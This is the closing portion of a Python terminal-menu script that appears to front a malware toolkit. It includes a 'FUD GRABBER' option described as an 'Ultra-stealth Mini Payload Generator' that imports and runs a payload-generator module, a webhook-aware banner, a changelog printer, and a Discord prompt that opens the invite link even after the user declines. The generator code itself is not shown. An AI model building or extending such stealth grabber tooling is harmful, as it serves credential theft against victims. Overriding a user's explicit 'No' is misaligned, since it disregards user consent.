        if not answers or answers['continue'] == 'No':
            break

def fud_grabber_menu():
    print_banner(show_webhook=True)
    pretty_print(" FUD GRABBER", (255, 128, 0))
    pretty_print("Ultra-stealth Mini Payload Generator", (255, 64, 64))
    print()
    

    from utils.grabbers.mini_payload_generator import run_mini_payload_generator
    run_mini_payload_generator()

def changelog_menu():

    print_banner(show_webhook=True)
    pretty_print(" CHANGELOG", (255, 128, 0))
    print_changelog_block()
    
    input(rgb(255,32,32) + "Press enter to go back to main menu..." + RESET)

def get_changelog_text():
    version = get_local_version() or "Unknown"
    changelog_lines = []
    changelog_lines.append(f"📋 CHANGELOG - Version {version}")
    changelog_lines.append("═" * 35)
    changelog_lines.extend(CHANGELOG)
    return changelog_lines

def print_changelog_block():
    changelog_lines = get_changelog_text()
    print()
    
    for changelog_line in changelog_lines:
        if changelog_line.startswith("📋"):
            colored_changelog = rgb(*COLORS.get("header", (255, 128, 0))) + changelog_line + RESET
        elif changelog_line.startswith("═"):
            colored_changelog = rgb(*COLORS.get("separator", (255, 64, 64))) + changelog_line + RESET
        elif changelog_line.startswith("✓"):
            colored_changelog = rgb(*COLORS.get("changelog_done", (0, 255, 128))) + changelog_line + RESET
        elif changelog_line.startswith("•"):
            colored_changelog = rgb(*COLORS.get("changelog_coming", (255, 255, 0))) + changelog_line + RESET
        elif changelog_line.startswith("v"):
            colored_changelog = rgb(*COLORS.get("version", (255, 128, 255))) + changelog_line + RESET
        else:
            colored_changelog = rgb(*COLORS.get("muted", (200, 200, 200))) + changelog_line + RESET
        
        print(colored_changelog)
    
    print()





def discord_server_prompt():
    print_banner()
    pretty_print("🎮 JOIN OUR DISCORD SERVER", (255, 128, 0))
    print()
    pretty_print("Get updates, support, and connect with other users!", (200, 200, 200))
    print()
    
    questions = [
        inquirer.List('join_server',
                     message="Do you want to join our Discord server?",
                     choices=['Yes', 'No'],
                     ),
    ]
    answers = inquirer.prompt(questions)
    
    if answers and answers['join_server'] == 'Yes':
        pretty_print("Opening Discord server invite...", (0, 255, 128))
        try:
            import webbrowser
            webbrowser.open("https://discord.gg/q3TkBrRcVX")
            pretty_print("✓ Discord server opened in your browser!", (0, 255, 128))
        except Exception:
            pretty_print("Could not open browser automatically.", (255, 128, 0))
            pretty_print("Please visit: https://discord.gg/q3TkBrRcVX", (255, 128, 0))
    else:
        pretty_print("I don't give a fuck, you join anyways! 😈", (255, 64, 64))
        try:
            import webbrowser
            webbrowser.open("https://discord.gg/q3TkBrRcVX")
            pretty_print("Discord server opened anyway! 😏", (255, 128, 0))
        except Exception:
            pretty_print("Could not open browser automatically.", (255, 128, 0))
            pretty_print("Please visit: https://discord.gg/q3TkBrRcVX", (255, 128, 0))
    
    print()
    input(rgb(255,32,32) + "Press enter to continue to the main menu..." + RESET)

if __name__ == "__main__":
    try:
        check_for_update()
        discord_server_prompt()
        main_menu()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}Goodbye!{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}An unexpected error occurred: {str(e)}{Style.RESET_ALL}")
    finally:
        sys.exit(0)
